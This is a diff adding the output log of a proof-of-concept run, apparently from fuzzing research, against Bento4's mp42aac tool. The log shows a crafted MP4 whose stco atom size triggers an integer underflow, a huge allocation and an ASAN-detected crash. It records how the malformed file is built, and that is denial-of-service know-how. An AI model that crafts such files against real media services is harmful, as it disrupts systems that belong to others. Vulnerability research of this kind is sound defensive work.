@@ -1,0 +1,17 @@
+=== VULN-003 PoC: AP4_StcoAtom integer underflow ===
+Date: Mon Sep  7 01:58:45 AM +08 2026
+
+[*] Generating vuln_003.mp4 ...
+[+] Written 457 bytes to /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Apps_Mp42Aac_Mp42Aac_cpp/vuln_003.mp4
+[+] stco declared size = 12 (AP4_FULL_ATOM_HEADER_SIZE)
+[+] Underflow: (12 - 12 - 4) / 4 = 0xFFFFFFFC / 4 = 0x3FFFFFFF
+[+] entry_count in stream = 0x3FFFFFFF
+[+] Expected: new AP4_UI32[0x3FFFFFFF] => ~4GB alloc => bad_alloc crash
+
+[*] Running mp42aac (mmap_limit_mb=3072 to force allocation failure) ...
+
+[*] ASAN/UBSAN log output:
+--- /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Apps_Mp42Aac_Mp42Aac_cpp/asan.log.258274 ---
+(total_mmaped >> 20) < common_flags()->mmap_limit_mb
+[*] Result summary:
+  => CRASH / ASAN ERROR DETECTED (see asan.log above)
